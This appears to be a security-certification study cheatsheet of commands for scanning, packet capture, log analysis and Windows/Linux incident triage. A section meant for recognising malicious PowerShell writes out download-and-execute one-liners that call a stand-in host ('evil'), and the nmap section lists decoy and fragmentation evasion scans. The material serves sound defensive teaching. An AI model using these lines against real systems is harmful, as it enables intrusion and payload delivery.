# Command-Line Cheatsheet

Performance-based questions hand you output and ask what happened. Read fluently.

---

## nmap

```bash
nmap -sn 10.0.0.0/24              # ping sweep, host discovery only, no port scan
nmap -sS -p- 10.0.0.5             # SYN (half-open) scan, all 65535 ports
nmap -sT 10.0.0.5                 # full TCP connect scan (no raw socket privs needed)
nmap -sU --top-ports 100 10.0.0.5 # UDP scan (slow)
nmap -sV -O 10.0.0.5              # service version + OS fingerprint
nmap -A 10.0.0.5                  # aggressive: -sV -O --script=default --traceroute
nmap -sC 10.0.0.5                 # default NSE scripts
nmap --script vuln 10.0.0.5       # vulnerability NSE category
nmap -Pn 10.0.0.5                 # skip host discovery (target blocks ping)
nmap -T4 10.0.0.5                 # timing template 0(paranoid)–5(insane)
nmap -oA scan                     # output all formats: .nmap .xml .gnmap
nmap -sS -D RND:10 10.0.0.5       # decoy scan (evasion)
nmap -f 10.0.0.5                  # fragment packets (evasion)
```

**Port states:** `open` · `closed` (RST returned) · `filtered` (no response —
firewall dropping) · `open|filtered` (UDP ambiguity) · `unfiltered`.

---

## tcpdump

```bash
tcpdump -i eth0 -nn -s0 -w cap.pcap        # capture full packets, no name resolution
tcpdump -r cap.pcap                        # read back
tcpdump -i eth0 host 10.0.0.5
tcpdump -i eth0 net 10.0.0.0/24
tcpdump -i eth0 port 443
tcpdump -i eth0 src 10.0.0.5 and dst port 53
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'   # SYN packets
tcpdump -i eth0 -A port 80                 # print payload as ASCII
tcpdump -i eth0 -c 100                     # stop after 100 packets
```

`-nn` (no DNS/port name lookup) and `-s0` (full snaplen) are the two flags to
memorise. Capture to disk, analyse afterwards.

---

## Wireshark display filters

```
ip.addr == 10.0.0.5
ip.src == 10.0.0.5 && ip.dst == 8.8.8.8
tcp.port == 445
http.request.method == "POST"
dns.qry.name contains "evil"
tcp.flags.syn == 1 && tcp.flags.ack == 0     # SYN only — scan detection
tcp.analysis.retransmission
frame contains "password"
http.response.code == 500
smtp || pop || imap
```

> **Capture filters use BPF syntax** (`host x`, `port y`) — display filters do
> not. Mixing them up is a classic mistake.

---

## Linux triage

```bash
ps aux --forest                    # process tree
ps -eo pid,ppid,user,cmd           # parent-child lineage
lsof -i                            # open network connections by process
lsof -p 1234                       # files open by a PID
netstat -antp   /   ss -antp       # listening + established sockets with PIDs
top / htop                         # live resource use
last / lastb                       # successful / failed logins
w / who                            # currently logged in
crontab -l ; ls -la /etc/cron.*    # scheduled task persistence
cat /etc/passwd ; cat /etc/shadow  # accounts
find / -perm -4000 -type f 2>/dev/null   # setuid binaries (privesc hunt)
find / -mtime -1 -type f 2>/dev/null     # files modified in last 24h
stat suspicious_file               # MAC times
history                            # shell history
journalctl -u sshd --since "1 hour ago"
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
```

---

## Log analysis idioms

```bash
# Top source IPs in a web log
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20

# All 500 errors
awk '$9 == 500' access.log

# Extract every IPv4 address from a file
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' file.log | sort -u

# Count requests per hour
awk '{print substr($4,2,14)}' access.log | uniq -c

# Find long URLs (possible injection / exfil)
awk 'length($7) > 200' access.log

# Unique user agents
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn
```

---

## Windows triage

```powershell
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name,CommandLine
Get-NetTCPConnection -State Established
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
Get-LocalUser ; Get-LocalGroupMember Administrators
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 50
Get-FileHash .\suspect.exe -Algorithm SHA256
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

```cmd
tasklist /v
netstat -anob
wmic process get name,processid,parentprocessid,commandline
schtasks /query /fo LIST /v
net user ; net localgroup administrators
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**Key Windows Security Event IDs**

| ID | Meaning |
|---|---|
| 4624 | Successful logon (check **Logon Type**: 2 interactive, 3 network, 10 RDP) |
| 4625 | Failed logon |
| 4634 / 4647 | Logoff |
| 4648 | Logon with explicit credentials (runas — lateral movement tell) |
| 4672 | Special privileges assigned (admin logon) |
| 4688 | Process creation (enable command-line auditing!) |
| 4697 / 7045 | Service installed |
| 4698 | Scheduled task created |
| 4719 | Audit policy changed (defence evasion) |
| 4720 | User account created |
| 4726 | User account deleted |
| 1102 | **Audit log cleared** — always investigate |
| 5140 | Network share accessed |

---

## Malicious PowerShell — recognise on sight

```powershell
powershell.exe -nop -w hidden -ExecutionPolicy Bypass -EncodedCommand <base64>
IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')
Invoke-WebRequest -Uri http://evil/x.exe -OutFile $env:TEMP\x.exe
[System.Convert]::FromBase64String($payload)
```

Decode base64 to see the real command:
```bash
echo '<base64>' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

---

## Hashing and file analysis

```bash
sha256sum file ; md5sum file
file suspicious.bin                # identify type by magic bytes
strings -n 8 suspicious.bin | less # readable strings (URLs, IPs, commands)
xxd suspicious.bin | head          # hex dump
exiftool image.jpg                 # metadata
binwalk firmware.bin               # embedded files
objdump -d binary                  # disassemble
readelf -h binary                  # ELF headers
```

High entropy across the whole file suggests packing or encryption.

---

## DNS and OSINT

```bash
dig example.com ANY
dig +short example.com MX
dig -x 8.8.8.8                     # reverse lookup
nslookup example.com
whois example.com                  # registration date matters
host -t txt example.com            # SPF/DMARC records live in TXT
dig _dmarc.example.com TXT
theHarvester -d example.com -b all
```

---

## curl for quick web checks

```bash
curl -I https://example.com                    # headers only
curl -sk https://10.0.0.5 -o /dev/null -w '%{http_code}\n'
curl -H "User-Agent: test" -X POST -d 'a=1' https://example.com
curl -s https://example.com | grep -i 'X-Powered-By'
```
